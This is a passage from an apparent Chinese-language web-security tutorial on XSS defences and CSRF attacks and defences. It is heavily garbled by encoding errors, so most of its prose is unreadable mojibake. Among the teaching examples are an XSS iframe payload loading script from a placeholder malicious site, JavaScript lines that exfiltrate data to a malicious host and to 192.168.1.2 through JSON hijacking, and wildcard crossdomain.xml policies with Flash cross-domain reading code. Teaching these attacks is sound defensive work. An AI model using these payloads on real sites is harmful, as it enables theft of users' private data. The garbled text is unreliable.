ï¼Œæ•ˆæœæœ€å¥½ï¼›str_replace()å‡½æ•°å¯ä»¥å°†æŒ‡å®šçš„å­—ç¬¦ä¸²è½¬æ¢ä¸ºå…¶ä»–å­—ç¬¦ä¸²çš„ï¼Œä½†æ˜¯ä¼šè¢«ç»•è¿‡ã€‚</p><p><strong>2ã€ä½¿ç”¨XSS Filter</strong></p><p><strong>ï¼ˆ1ï¼‰è¾“å…¥è¿‡æ»¤</strong></p><p>â€‹    è¾“å…¥éªŒè¯ï¼ˆå®¢æˆ·ç«¯ï¼‰ï¼šå‰ç«¯JSè¿‡æ»¤ï¼Œå¦‚æ£€æµ‹æœ€å¤§é•¿åº¦ã€æ˜¯å¦åªæœ‰åˆæ³•å­—ç¬¦ã€æ ¼å¼æ˜¯å¦ç¬¦åˆè¦æ±‚ã€æ•°å­—æ˜¯å¦åœ¨æŒ‡å®šçš„èŒƒå›´å†…ã€‚ç¼ºç‚¹å°±æ˜¯å®¹æ˜“è¢«ä¿®æ”¹æ‰ã€‚</p><p>â€‹    æ•°æ®æ¶ˆæ¯’ï¼ˆæœåŠ¡å™¨ç«¯ï¼‰ï¼šè¿‡æ»¤æ•æ„Ÿå­—ç¬¦ï¼ˆå¯ä»¥å’ŒSQLæ³¨å…¥çš„ä¸€åŒè¿‡æ»¤ï¼‰ï¼Œå¦‚&lt; &gt; javascript â€˜ â€œ &amp; # expressionç­‰ã€‚</p><p><strong>ï¼ˆ2ï¼‰ è¾“å‡ºç¼–ç ï¼ˆæœåŠ¡å™¨ç«¯ï¼‰</strong></p><p>â€‹    å¯ä»¥ä½¿ç”¨HTMLç¼–ç ï¼ˆPHPçš„htmlspecialchars()å‡½æ•°ã€ASPçš„Server.HTMLEncode()å‡½æ•°ã€ASP.NETçš„Server.HtmlEncode()å‡½æ•°ï¼‰ï¼Œç”¨å¯¹åº”çš„HTMLå®ä½“æ›¿ä»£å­—é¢é‡å­—ç¬¦ï¼Œæ­¤æ—¶æµè§ˆå™¨ä¼šå°†æ¶æ„ä»£ç å½“ä½œHTMLæ–‡æ¡£çš„å†…å®¹è€Œä¸æ˜¯ç»“æ„åŠ ä»¥å¤„ç†ã€‚</p><p>å¸¸è§æ¶æ„å­—ç¬¦çš„HTMLç¼–ç ï¼ˆæ˜¾ç¤ºã€å®ä½“åå­—ã€å®ä½“ç¼–å·ï¼‰ï¼š</p><p>&lt;  &lt;;  &amp;#60ï¼›</p><p>>  &gt;  &amp;#62ï¼›</p><p>&amp;  &amp;  &amp;#38ï¼›</p><p>â€œ  â€œ  &amp;#34ï¼›</p><p>â€˜          â€˜</p><p><strong>3ã€ç™½åå•å’Œé»‘åå•ç»“åˆ</strong></p><p><strong>4ã€Noscript</strong></p><p>â€‹    Firefoxçš„ä¸€æ¬¾å…è´¹çš„å¼€æºæ’ä»¶ï¼Œé»˜è®¤ç¦æ­¢æ‰€æœ‰è„šæœ¬ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡è‡ªå®šä¹‰è®¾ç½®å…è®¸é€šè¿‡çš„è„šæœ¬ã€‚</p><p><strong>5ã€Anti_XSS</strong></p><p>â€‹    æä¾›å¤§é‡çš„ç¼–ç å‡½æ•°ç”¨äºå¤„ç†ç”¨æˆ·çš„è¾“å…¥ï¼Œå®ç°ç™½åå•æœºåˆ¶å’Œè¾“å‡ºè½¬ä¹‰ã€‚</p><p><strong>6ã€HttpOnly</strong></p><p>â€‹    æ”»å‡»è€…é€šè¿‡XSSæ¼æ´æ‰§è¡ŒJSä¸­çš„document.cookieæ–¹æ³•æ¥çªƒå–ç”¨æˆ·çš„cookieä¿¡æ¯ã€‚Webåº”ç”¨ç¨‹åºåœ¨Set-Cookieæ—¶å°†å…¶å±æ€§è®¾ä¸ºHttpOnlyå³å¯é¿å…Cookieè¢«å®¢æˆ·ç«¯JSå­˜å–ï¼Œä¹Ÿå¯ä»¥ä¿æŠ¤ç”¨æˆ·çš„Cookieä¿¡æ¯ä¸è¢«ç›—å–ã€‚</p><p>â€‹    PHPè®¾ç½®HttpOnlyçš„æ–¹æ³•ï¼š</p><p>â€‹    ï¼ˆ1ï¼‰ ä¿®æ”¹php.iniæ–‡ä»¶ï¼Œè®¾ç½®å…¶å€¼ä¸º1æˆ–TRUEï¼›</p><p>â€‹    ï¼ˆ2ï¼‰ setcookie()å‡½æ•°å’Œsetrawcookie()å‡½æ•°çš„ç¬¬ä¸ƒä¸ªå‚æ•°ï¼›</p><p>â€‹    ï¼ˆ3ï¼‰åœ¨PHPä»£ç ä¸­å¼€å¯ã€‚</p><p><strong>7ã€Webå®‰å…¨ç¼–ç è§„èŒƒ</strong></p><p>â€‹    å¯¹æ•æ„Ÿå­—ç¬¦è½¬ä¹‰ã€URLå±æ€§è¿›è¡Œç›¸åº”çš„è§„å®šç­‰ã€‚</p><p><strong>8ã€å°½é‡ä½¿ç”¨WAF</strong></p><p><strong>9ã€é˜²å¾¡DOMå‹XSS</strong></p><p>DOMå‹XSSä¸»è¦æ˜¯ç”±å®¢æˆ·ç«¯çš„è„šæœ¬é€šè¿‡DOMåŠ¨æ€åœ°è¾“å‡ºæ•°æ®åˆ°é¡µé¢è€Œä¸æ˜¯ä¾èµ–äºå°†æ•°æ®æäº¤ç»™æœåŠ¡å™¨ç«¯ï¼Œè€Œä»å®¢æˆ·ç«¯è·å¾—DOMä¸­çš„æ•°æ®åœ¨æœ¬åœ°æ‰§è¡Œï¼Œå› è€Œä»…ä»æœåŠ¡å™¨ç«¯æ˜¯æ— æ³•é˜²å¾¡çš„ã€‚å…¶é˜²å¾¡åœ¨äºï¼š</p><p>ï¼ˆ1ï¼‰ é¿å…å®¢æˆ·ç«¯æ–‡æ¡£é‡å†™ã€é‡å®šå‘æˆ–å…¶ä»–æ•æ„Ÿæ“ä½œï¼ŒåŒæ—¶é¿å…ä½¿ç”¨å®¢æˆ·ç«¯æ•°æ®ï¼Œè¿™äº›æ“ä½œå°½é‡åœ¨æœåŠ¡å™¨ç«¯ä½¿ç”¨åŠ¨æ€é¡µé¢æ¥å®ç°ï¼›</p><p>ï¼ˆ2ï¼‰ åˆ†æå’Œå¼ºåŒ–å®¢æˆ·ç«¯JSä»£ç ï¼Œç‰¹åˆ«æ˜¯å—åˆ°ç”¨æˆ·å½±å“çš„DOMå¯¹è±¡ï¼Œæ³¨æ„èƒ½ç›´æ¥ä¿®æ”¹DOMå’Œåˆ›å»ºHTMLæ–‡ä»¶çš„ç›¸å…³å‡½æ•°æˆ–æ–¹æ³•ï¼Œå¹¶åœ¨è¾“å‡ºå˜é‡åˆ°é¡µé¢æ—¶å…ˆè¿›è¡Œç¼–ç è½¬ä¹‰ï¼Œå¦‚è¾“å‡ºåˆ°HTMLåˆ™è¿›è¡ŒHTMLç¼–ç ã€è¾“å‡ºåˆ°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br></pre></td></tr></table></figure><p>åˆ™è¿›è¡ŒJSç¼–ç ã€‚</p><h2 id="CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰"><a href="#CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰" class="headerlink" title="CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰"></a>CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰</h2><h3 id="ä¸€ã€åŸºæœ¬æ¦‚å¿µ-2"><a href="#ä¸€ã€åŸºæœ¬æ¦‚å¿µ-2" class="headerlink" title="ä¸€ã€åŸºæœ¬æ¦‚å¿µ"></a>ä¸€ã€åŸºæœ¬æ¦‚å¿µ</h3><p><strong>æ¼æ´å®šä¹‰</strong></p><p>ã€€ã€€è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆCross-Site Request Forgeryï¼ŒCSRFï¼‰æ˜¯ä¸€ç§ä½¿å·²ç™»å½•ç”¨æˆ·åœ¨ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹æ‰§è¡ŒæŸç§åŠ¨ä½œçš„æ”»å‡»ã€‚å› ä¸ºæ”»å‡»è€…çœ‹ä¸åˆ°ä¼ªé€ è¯·æ±‚çš„å“åº”ç»“æœï¼Œæ‰€ä»¥CSRFæ”»å‡»ä¸»è¦ç”¨æ¥æ‰§è¡ŒåŠ¨ä½œï¼Œè€Œéçªƒå–ç”¨æˆ·æ•°æ®ã€‚å½“å—å®³è€…æ˜¯ä¸€ä¸ªæ™®é€šç”¨æˆ·æ—¶ï¼ŒCSRFå¯ä»¥å®ç°åœ¨å…¶ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹è½¬ç§»ç”¨æˆ·èµ„é‡‘ã€å‘é€é‚®ä»¶ç­‰æ“ä½œï¼›ä½†æ˜¯å¦‚æœå—å®³è€…æ˜¯ä¸€ä¸ªå…·æœ‰ç®¡ç†å‘˜æƒé™çš„ç”¨æˆ·æ—¶CSRFåˆ™å¯èƒ½å¨èƒåˆ°æ•´ä¸ªWebç³»ç»Ÿçš„å®‰å…¨ã€‚</p><p><strong>æˆå› </strong></p><p>ç”±äºç¨‹åºå‘˜çš„ä¸ä¸¥è°¨å¯¼è‡´Webåº”ç”¨ç¨‹åºå­˜åœ¨æ¼æ´</p><p>Webæµè§ˆå™¨å¯¹Cookieå’ŒHTTPèº«ä»½éªŒè¯ç­‰ä¼šè¯ä¿¡æ¯çš„å¤„ç†å­˜åœ¨ç¼ºé™·</p><p><strong>æ¼æ´åˆ©ç”¨çš„å‰æ</strong></p><p>ç”¨æˆ·å·²ç»å®Œæˆèº«ä»½è®¤è¯</p><p>æ–°è¯·æ±‚çš„æäº¤ä¸éœ€è¦é‡æ–°èº«ä»½è®¤è¯æˆ–ç¡®è®¤æœºåˆ¶</p><p>æ”»å‡»è€…å¿…é¡»äº†è§£Web APPè¯·æ±‚çš„å‚æ•°æ„</p><p>ç”¨æˆ·ä¼šè¢«å¸å¼•å»ç‚¹å‡»é“¾æ¥</p><p><strong>CSRFä¸XSSçš„åŒºåˆ«ä¸å…³ç³»</strong></p><p>XSSä¸»è¦åˆ©ç”¨ç”¨æˆ·å¯¹ç«™ç‚¹çš„ä¿¡ä»»ï¼Œè€ŒCSRFä¸»è¦æ˜¯åˆ©ç”¨ç«™ç‚¹å¯¹å·²çŸ¥èº«ä»½è®¤è¯çš„ä¿¡ä»»ã€‚æ¢å¥è¯è¯´ï¼ŒXSSæ˜¯ç”¨æˆ·è‡ªå·±ç‚¹å‡»é“¾æ¥æ¥è®¿é—®ç›¸åº”çš„ç½‘é¡µçš„ï¼Œè€ŒCSRFæ˜¯åœ¨ç”¨æˆ·å¹¶ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹æ¥æäº¤è¯·æ±‚çš„ã€‚å¦å¤–ï¼Œä¸¤è€…çš„äº§ç”Ÿçš„åŸå› ä¹Ÿä¸ä¸€æ ·ï¼ŒCSRFçš„æ˜¯å› ä¸ºé‡‡ç”¨äº†éšå¼çš„è®¤è¯æ–¹å¼ï¼Œè€ŒXSSçš„æ˜¯å› ä¸ºå¯¹ç”¨æˆ·è¾“å…¥æ²¡æœ‰è¿›è¡Œæœ‰æ•ˆçš„è¿‡æ»¤ã€‚</p><p>ä¸¤è€…å‡åˆ©ç”¨ç”¨æˆ·çš„ä¼šè¯æ‰§è¡ŒæŸäº›æ“ä½œï¼›è‹¥ä¸€ä¸ªç«™ç‚¹å­˜åœ¨XSSæ¼æ´ï¼Œåˆ™å¾ˆå¤§å¯èƒ½ä¹Ÿå­˜åœ¨CSRFæ¼æ´ï¼›è‹¥CSRFçš„æ¶æ„ä»£ç å­˜åœ¨äºç¬¬ä¸‰æ–¹çš„ç«™ç‚¹ï¼Œå³ä½¿èƒ½æœ‰æ•ˆåœ°è¿‡æ»¤ç”¨æˆ·çš„è¾“å…¥è€Œé˜²æ­¢XSSï¼Œä¹Ÿæœªå¿…èƒ½é˜²å¾¡CSRFã€‚</p><p><strong>æ”»å‡»æ–¹å¼</strong></p><p>GETå‹ä¸POSTå‹CSRFï¼šä¸»è¦å–å†³äºç›¸åº”æ“ä½œå¯¹æäº¤æ–¹å¼çš„é™åˆ¶ï¼Œå…¶åŸç†éƒ½æ˜¯äº‹å…ˆæ„é€ å‡ºä¸€ä¸ªæ¶æ„çš„è¯·æ±‚ï¼Œç„¶åè¯±å¯¼ç”¨æˆ·ç‚¹å‡»æˆ–è®¿é—®ï¼Œä»è€Œå‡å€Ÿç”¨æˆ·èº«ä»½å®Œæˆç›¸åº”çš„æ“ä½œã€‚å¦å¤–ï¼Œæœ‰äº›POSTå‹CSRFä¹Ÿå¯èƒ½ä¼šåˆ©ç”¨javascriptè¿›è¡Œè‡ªåŠ¨æäº¤è¡¨å•å®Œæˆæ“ä½œã€‚</p><p>Flashå‹CSRFï¼šé€šå¸¸æ˜¯ç”±äºCrossdomain.xmlæ–‡ä»¶é…ç½®ä¸å½“é€ æˆçš„ï¼Œåˆ©ç”¨æ–¹æ³•æ˜¯ä½¿ç”¨swfæ¥å‘èµ·è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼Œå¦‚:</p><p>Flashè·¨åŸŸæƒé™ç®¡ç†æ–‡ä»¶è®¾ç½®ä¸ºå…è®¸æ‰€æœ‰ä¸»æœº/åŸŸåè·¨åŸŸå¯¹æœ¬ç«™è¿›è¡Œè¯»å†™æ•°æ®ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">This XML file does not appear to have any style information associated with it. The document tree is shown below.</span><br><span class="line"><span class="tag">&lt;<span class="name">cross-domain-policy</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">allow-access-from</span> <span class="attr">domain</span>=<span class="string">"*"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">cross-domain-policy</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Flashè·¨åŸŸæƒé™ç®¡ç†æ–‡ä»¶è¿‡æ»¤è§„åˆ™ä¸ä¸¥(domain=â€*â€)ï¼Œå¯¼è‡´å¯ä»¥ä»å…¶å®ƒä»»ä½•åŸŸä¼ Flashäº§ç”ŸCSRFã€‚</p><p>CSRFè •è™«ï¼šCSRFå¸¸è§çš„å±å®³æ˜¯æ”»å‡»è€…å¯ä»¥åœ¨ç”¨æˆ·ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹ä»¥ç”¨æˆ·çš„èº«ä»½è¿›è¡ŒæŒ‡å®šçš„æ“ä½œï¼Œä½†å®é™…ä¸ŠCSRFçš„å±å®³è¿œä¸æ­¢äºæ­¤ï¼Œç»è¿‡ç‰¹æ„æ„é€ çš„CSRFå¯ä»¥äº§ç”Ÿè •è™«çš„æ•ˆæœã€‚å¦‚ï¼šæŸç¤¾åŒºç§ä¿¡å¥½å‹çš„æ¥å£å’Œè·å–å¥½å‹åˆ—è¡¨çš„æ¥å£éƒ½å­˜åœ¨CSRFæ¼æ´ï¼Œæ”»å‡»è€…å°±å¯ä»¥å°†å…¶ç»„åˆæˆä¸€ä¸ªCSRFè •è™«â€”â€”å½“ä¸€ä¸ªç”¨æˆ·è®¿é—®æ¶æ„é¡µé¢åé€šè¿‡CSRFè·å–å…¶å¥½å‹åˆ—è¡¨ä¿¡æ¯ï¼Œç„¶åå†åˆ©ç”¨ç§ä¿¡å¥½å‹çš„CSRFæ¼æ´ç»™å…¶æ¯ä¸ªå¥½å‹å‘é€ä¸€æ¡æŒ‡å‘æ¶æ„é¡µé¢çš„ä¿¡æ¯ï¼Œåªè¦æœ‰äººæŸ¥çœ‹è¿™ä¸ªä¿¡æ¯é‡Œçš„é“¾æ¥ï¼ŒCSRFè •è™«å°±ä¼šä¸æ–­ä¼ æ’­ä¸‹å»ï¼Œå…¶å¯èƒ½é€ æˆçš„å±å®³å’Œå½±å“éå¸¸å·¨å¤§ï¼</p><h3 id="äºŒã€CSRFæ”»å‡»è·å–æ•°æ®çš„æ–¹æ³•"><a href="#äºŒã€CSRFæ”»å‡»è·å–æ•°æ®çš„æ–¹æ³•" class="headerlink" title="äºŒã€CSRFæ”»å‡»è·å–æ•°æ®çš„æ–¹æ³•"></a>äºŒã€CSRFæ”»å‡»è·å–æ•°æ®çš„æ–¹æ³•</h3><p>è¦è·å–çš„å…³é”®æ•°æ®ï¼šç”¨æˆ· idã€ç”¨æˆ·æ˜µç§°ã€ç”¨æˆ· emailã€ç”¨æˆ·ä¸ªäººé¡µé¢åœ°å€ç­‰ã€‚</p><p>åŒåŸŸå†… CSRF æ”»å‡»è·å–æ•°æ®å‡ ä¹æ²¡ä»»ä½•é™åˆ¶ã€‚</p><p>è·¨åŸŸ CSRF æ”»å‡»è·å–æ•°æ®çš„å‡ ç§æ–¹æ³•æ€»ç»“å¦‚ä¸‹ï¼š</p><p><strong>1ã€ç»“åˆXSS ç»„åˆæ¼æ´</strong></p><p>åˆ©ç”¨XSS è·å–æ•°æ®ï¼Œå¦‚ä¹‹å‰å…³äºXSSæ–‡ç« åšçš„ä¸‰æ–¹çš„æ¼”ç¤ºï¼Œä½¿ç”¨ç›®æ ‡ç«™ç‚¹ä¸Šçš„XSS æ¼æ´ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">width</span>=<span class="string">0</span> <span class="attr">height</span>=<span class="string">0</span> <span class="attr">src</span>=<span class="string">â€˜http://ç›®æ ‡ç«™ç‚¹/search.php?k</span>=<span class="string">â€œ</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://æ¶æ„ç«™ç‚¹/get.js</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>â€™&gt;<span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­get.js çš„ä»£ç ä¸ºï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//use DOM method to get your data</span></span><br><span class="line"><span class="keyword">new</span> Image(). src=â€˜http:<span class="comment">//æ¶æ„ç«™ç‚¹/a.php?data=â€˜+data;</span></span><br></pre></td></tr></table></figure><p>æ¶æ„ç«™ç‚¹çš„ a.php æ–‡ä»¶æ¥æ”¶å”¯ä¸€æ ‡è¯†ç­‰æ•°æ®ï¼Œè¯¥å”¯ä¸€æ ‡è¯†å¯ä»¥æ˜¯ url ä¸­çš„æˆ–æ˜¯ç›®æ ‡ç«™ç‚¹url å¯¹åº”çš„å†…å®¹ä¸­çš„ã€‚è¿™æ ·å—å®³è€…å°±ä¼šè®¿é—®åˆ°ç¬¬ä¸‰æ–¹çš„æ¶æ„ç½‘ç«™ä»è€Œæ³„éœ²ä¿¡æ¯ã€‚</p><p><strong>2ã€JSON Hijacing</strong></p><p>ç›®æ ‡ç«™ç‚¹ä½¿ç”¨äº† JSON æ•°æ®ä¼ è¾“ç”¨æˆ·ç§æœ‰æ•°æ®ï¼Œå…¶ä¸­åŒ…å«éœ€è¦çš„å”¯ä¸€æ ‡è¯†ç­‰ä¿¡æ¯ã€‚</p><p>ç›¸å…³ä»£ç ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; <span class="function"><span class="keyword">function</span> <span class="title">hijack</span>(<span class="params">o</span>)</span>&#123;</span><br><span class="line"><span class="comment">//use DOM method to get your data</span></span><br><span class="line"><span class="keyword">new</span> Image().src=<span class="string">"http://192.168.1.2/JSONHiJack.asp?hi="</span>+<span class="built_in">escape</span>(data);</span><br><span class="line">&#125;&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;script src=http:/</span><span class="regexp">/api.fanfou.com/</span>private_messages/inbox.json?callback=hijack&amp;count=<span class="number">2</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><strong>3ã€Flash AsctionScriptï¼ˆcrossdomain.xmlï¼‰</strong></p><p>å‰ææ˜¯ç›®æ ‡ç«™ç‚¹ä¸‹å­˜åœ¨crossdomain.xmlæ–‡ä»¶ï¼Œä¸”å…¶é…ç½®å…è®¸å…¶ä»–åŸŸçš„ ASè„šæœ¬è¿›è¡Œè·¨åŸŸè¯·æ±‚ã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">cross-domain-policy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">allow-access-from</span> <span class="attr">domain</span>=<span class="string">"*"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">cross-domain-policy</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ç›¸å…³ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flash.net.*; </span><br><span class="line">var _l = new URLLoader(new URLRequest(â€œhttp://ç›®æ ‡ç«™ç‚¹/<span class="string">"));</span></span><br><span class="line"><span class="string">_l.addEventListener(Event.COMPLETE,function()&#123;text1.text = _l.data&#125;);</span></span><br><span class="line"><span class="string">_l.load();</span></span><br></pre></td></tr></table></figure><p><strong>4ã€æœåŠ¡ç«¯ä»£ç†æŠ€æœ¯</strong></p><h3 id="ä¸‰ã€æ£€æµ‹æ–¹æ³•-2"><a href="#ä¸‰ã€æ£€æµ‹æ–¹æ³•-2" class="headerlink" title="ä¸‰ã€æ£€æµ‹æ–¹æ³•"></a>ä¸‰ã€æ£€æµ‹æ–¹æ³•</h3><p>æœ€ç®€å•çš„æ–¹æ³•å°±æ˜¯æŠ“å–ä¸€ä¸ªæ­£å¸¸è¯·æ±‚çš„æ•°æ®åŒ…ï¼Œå»æ‰ Referer å­—æ®µåå†é‡æ–°æäº¤ï¼Œå¦‚æœè¯¥æäº¤è¿˜æœ‰æ•ˆï¼Œé‚£ä¹ˆåŸºæœ¬ä¸Šå¯ä»¥ç¡®å®šå­˜åœ¨ CSRF æ¼æ´ã€‚å¦å¤–è¿˜éœ€è¦ç¡®è®¤æ•°æ®åŒ…ä¸­ç¡®å®æ²¡æœ‰å«æœ‰tokenå­—æ ·ï¼Œå³ä½¿æœ‰ä¹Ÿå°è¯•å»æ‰å†å‘åŒ…çœ‹æ˜¯å¦æ˜¯è¿›è¡Œæœ‰æ•ˆçš„CSRFæ ¡éªŒå³å¯ã€‚</p><p>ä¸€äº›ä¸“é—¨é’ˆå¯¹ CSRF æ¼æ´è¿›è¡Œæ£€æµ‹çš„å·¥å…·ï¼Œå¦‚CSRFTesterï¼ŒCSRF Request Builder ç­‰ã€‚</p><p>ä»¥ CSRFTester å·¥å…·ä¸ºä¾‹ï¼ŒCSRF æ¼æ´æ£€æµ‹å·¥å…·çš„æµ‹è¯•åŸç†å¦‚ä¸‹ï¼šä½¿ç”¨ CSRFTester è¿›è¡Œæµ‹è¯•æ—¶ï¼Œé¦–å…ˆéœ€è¦æŠ“å–æˆ‘ä»¬åœ¨æµè§ˆå™¨ä¸­è®¿é—®è¿‡çš„æ‰€æœ‰é“¾æ¥ä»¥åŠæ‰€æœ‰çš„è¡¨å•ç­‰ä¿¡æ¯ï¼Œç„¶åé€šè¿‡åœ¨ CSRFTester ä¸­ä¿®æ”¹ç›¸åº”çš„è¡¨å•ç­‰ä¿¡æ¯ï¼Œé‡æ–°æäº¤ï¼Œè¿™ç›¸å½“äºä¸€æ¬¡ä¼ªé€ å®¢æˆ·ç«¯è¯·æ±‚ã€‚å¦‚æœä¿®æ”¹åçš„æµ‹è¯•è¯·æ±‚æˆåŠŸè¢«ç½‘ç«™æœåŠ¡å™¨æ¥å—ï¼Œåˆ™è¯´æ˜å­˜åœ¨CSRF æ¼æ´ï¼Œå½“ç„¶æ­¤æ¬¾å·¥å…·ä¹Ÿå¯ä»¥è¢«ç”¨æ¥è¿›è¡Œ CSRF æ”»å‡»ã€‚</p><h3 id="å››ã€é˜²å¾¡æ–¹æ³•-2"><a href="#å››ã€é˜²å¾¡æ–¹æ³•-2" class="headerlink" title="å››ã€é˜²å¾¡æ–¹æ³•"></a>å››ã€é˜²å¾¡æ–¹æ³•</h3><p><strong>1ã€ æœåŠ¡ç«¯çš„é˜²å¾¡</strong></p><p>ä¸»è¦æœ‰ 5 ç§ç­–ç•¥ï¼šéªŒè¯ HTTPçš„Refererå­—æ®µã€åœ¨è¯·æ±‚åœ°å€ä¸­æ·»åŠ  token å¹¶éªŒè¯ã€åœ¨ HTTP å¤´ä¸­è‡ªå®šä¹‰å±æ€§å¹¶éªŒè¯ã€ä½¿ç”¨POSTæ›¿ä»£GETç­‰ã€‚</p><p>ï¼ˆ1ï¼‰ã€éªŒè¯ HTTPçš„Refererå­—æ®µï¼Œåœ¨ HTTP å¤´çš„Refererå­—æ®µè®°å½•äº†è¯¥ HTTP è¯·æ±‚çš„æ¥æºåœ°å€ã€‚é¡ºä¾¿è§£å†³äº†éæ³•ç›—é“¾ã€ç«™å¤–æäº¤ç­‰é—®é¢˜ã€‚åœ¨é€šå¸¸æƒ…å†µä¸‹ï¼Œè®¿é—®ä¸€ä¸ªå®‰å…¨å—é™é¡µé¢çš„è¯·æ±‚å¿…é¡»æ¥è‡ªäºåŒä¸€ä¸ªç½‘ç«™ã€‚</p><p>ï¼ˆ2ï¼‰ã€åœ¨è¯·æ±‚åœ°å€ä¸­æ·»åŠ  token å¹¶éªŒè¯ï¼Œå¯ä»¥åœ¨ HTTPè¯·æ±‚ä¸­ä»¥å‚æ•°çš„å½¢å¼åŠ å…¥ä¸€ä¸ªéšæœºäº§ç”Ÿçš„ tokenï¼Œå¹¶åœ¨æœåŠ¡å™¨ç«¯å»ºç«‹ä¸€ä¸ªæ‹¦æˆªå™¨æ¥éªŒè¯è¿™ä¸ªtokenï¼Œå¦‚æœè¯·æ±‚ä¸­æ²¡æœ‰ token æˆ–è€… token å†…å®¹ä¸æ­£ç¡®ï¼Œåˆ™è®¤ä¸ºå¯èƒ½æ˜¯ CSRF æ”»å‡»è€Œæ‹’ç»è¯¥è¯·æ±‚ã€‚æŠµå¾¡ CSRF æ”»å‡»çš„å…³é”®åœ¨äºï¼šåœ¨è¯·æ±‚ä¸­åŠ å…¥æ”»å‡»è€…æ‰€ä¸èƒ½ä¼ªé€ çš„ä¿¡æ¯ï¼Œå¹¶ä¸”è¯¥ä¿¡æ¯ä¸å­˜åœ¨äº Cookie ä¹‹ä¸­ã€‚</p><p>ï¼ˆ3ï¼‰ã€åœ¨ HTTP å¤´ä¸­è‡ªå®šä¹‰å±æ€§å¹¶éªŒè¯ï¼Œä¹Ÿæ˜¯ä½¿ç”¨ token å¹¶è¿›è¡ŒéªŒè¯ï¼Œä½†å¹¶ä¸æ˜¯æŠŠ tokenä»¥å‚æ•°çš„å½¢å¼ç½®äº HTTP è¯·æ±‚è€Œæ˜¯æ”¾åˆ° HTTP å¤´ä¸­è‡ªå®šä¹‰çš„å±æ€§é‡Œã€‚é€šè¿‡XMLHttpRequest è¿™ä¸ªç±»ï¼Œå¯ä»¥ä¸€æ¬¡æ€§ç»™æ‰€æœ‰è¯¥ç±»è¯·æ±‚åŠ ä¸Š csrftoken è¿™ä¸ª HTTP å¤´å±æ€§ï¼Œå¹¶æŠŠtoken å€¼æ”¾å…¥å…¶ä¸­ã€‚è¿™æ ·è§£å†³äº†å‰ä¸€ç§æ–¹æ³•åœ¨è¯·æ±‚ä¸­åŠ å…¥ token çš„ä¸ä¾¿ï¼ŒåŒæ—¶ï¼Œé€šè¿‡è¿™ä¸ªç±»è¯·æ±‚çš„åœ°å€ä¸ä¼šè¢«è®°å½•åˆ°æµè§ˆå™¨çš„åœ°å€æ ï¼Œä¹Ÿä¸ç”¨æ‹…å¿ƒ token ä¼šé€šè¿‡ Referer æ³„éœ²åˆ°å…¶ä»–ç½‘ç«™ã€‚</p><p>ï¼ˆ4ï¼‰ã€ä¸¥æ ¼åŒºåˆ†å¥½ POST ä¸ GET çš„æ•°æ®è¯·æ±‚ï¼Œå°½é‡ä½¿ç”¨POSTæ¥æ›¿ä»£GETï¼Œå¦‚åœ¨ asp ä¸­ä¸è¦ä½¿ç”¨ Request æ¥ç›´æ¥è·å–æ•°æ®ã€‚åŒæ—¶å»ºè®®ä¸è¦ç”¨ GET è¯·æ±‚æ¥æ‰§è¡ŒæŒä¹…æ€§æ“ä½œã€‚</p><p>ï¼ˆ5ï¼‰ã€ä½¿ç”¨éªŒè¯ç æˆ–è€…å¯†ç ç¡®è®¤æ–¹å¼ï¼Œç¼ºç‚¹æ˜¯ç”¨æˆ·ä½“éªŒå·®ã€‚</p><p><strong>2ã€ ç”¨æˆ·ç«¯çš„é˜²å¾¡</strong></p><p>ç”¨æˆ·çš„å®‰å…¨æ„è¯†ä¸è‰¯å¥½çš„ä¸Šç½‘ä¹ æƒ¯ã€‚</p><p><strong>3ã€ 